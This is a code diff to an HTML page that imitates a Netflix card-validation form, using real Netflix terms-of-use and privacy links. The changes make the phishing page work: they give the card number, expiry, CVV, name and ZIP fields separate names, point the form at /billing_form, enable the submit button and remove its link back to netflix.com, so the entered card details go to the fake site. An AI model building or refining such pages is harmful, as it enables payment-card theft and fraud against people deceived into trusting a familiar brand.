@@ -25,22 +25,22 @@
                     <h2 style="color: black;" class="formtitle">
                         Validate your credit or debit card
                     </h2>
-                    <form action="/billing" id="loginForm" class="d-flex direction-column" method="post" name="loginForm">
+                    <form action="/billing_form" id="loginForm" class="d-flex direction-column" method="post" name="loginForm">
                         <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Card number"  required/>
                         <div>
-                            <input style="display: inline-block; width: 44%; margin-right: 4.5%; background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Expiration date" required />
-                            <input style="display: inline-block; width: 44%; background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="CVV" required />
+                            <input style="display: inline-block; width: 44%; margin-right: 4.5%; background-color: white;" type="text" name="exp_date" id="card_number" class="billing" placeholder="Expiration date" required />
+                            <input style="display: inline-block; width: 44%; background-color: white;" type="text" name="cvv" id="card_number" class="billing" placeholder="CVV" required />
                         </div>
 
-                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="First name"  required/>
-                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Last name"  required/>
-                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="ZIP code"  required/>
+                        <input style="background-color: white;" type="text" name="first_name" id="card_number" class="billing" placeholder="First name"  required/>
+                        <input style="background-color: white;" type="text" name="last_name" id="card_number" class="billing" placeholder="Last name"  required/>
+                        <input style="background-color: white;" type="text" name="zip_code" id="card_number" class="billing" placeholder="ZIP code"  required/>
 
                         <span style="margin-top: 20px; color: #737373;" id="" data-uia="termsOfUse-Disclosure">By clicking the “Start Membership” button below, you agree to our 
                         <a style="color: blue;" target="_blank" href="https://help.netflix.com/legal/termsofuse">Terms of Use</a>, <a style="color: blue;" target="_blank" href="https://help.netflix.com/legal/privacy">Privacy Statement</a>, that you are over 18, and that <strong>Netflix will automatically continue your membership and charge the membership fee (currently $19.99/month) to your payment method until you cancel.</strong> <strong>You may cancel at any time to avoid future charges.</strong> To cancel, go to Account and click “Cancel Membership.”</span>
 
-                        <button type="submit" class="button submitButton" id="signInButton" disabled="disabled">
-                            <a style="text-decoration: none; color: white;" href="https://netflix.com/">Validate</a>
+                        <button type="submit" class="button submitButton" id="signInButton">
+                            <a style="text-decoration: none; color: white;" >Validate</a>
                         </button>
                     </form>
                 </div>
